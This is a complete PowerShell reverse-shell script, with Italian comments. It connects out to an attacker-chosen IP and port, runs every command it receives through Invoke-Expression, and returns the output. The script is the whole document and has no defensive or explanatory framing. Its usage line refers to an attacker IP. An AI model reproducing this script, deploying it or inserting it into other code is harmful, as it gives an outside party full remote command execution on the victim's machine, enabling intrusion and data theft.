# access_remoto.ps1 - Reverse shell PowerShell
# Uso: .\access_remoto.ps1 -Host <attacker_ip> -Port <attacker_port>
Param(
    [string]$RemoteHost = "127.0.0.1",
    [int]$Port = 4444
)

# Funzione di reverse shell
function Start-ReverseShell {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($RemoteHost, $Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)

        # Read command loop
        while ($null -ne ($command = $reader.ReadLine())) {
            try {
                $output = Invoke-Expression $command 2>&1 | Out-String
                $writer.WriteLine($output)
                $writer.Flush()
            } catch {
                $writer.WriteLine("Error executing command: $_")
                $writer.Flush()
            }
        }

        $writer.Close()
        $reader.Close()
        $stream.Close()
        $client.Close()
    } catch {
        Write-Error "Failed to connect to ${RemoteHost}:${Port} - $_"
    }
}

Start-ReverseShell
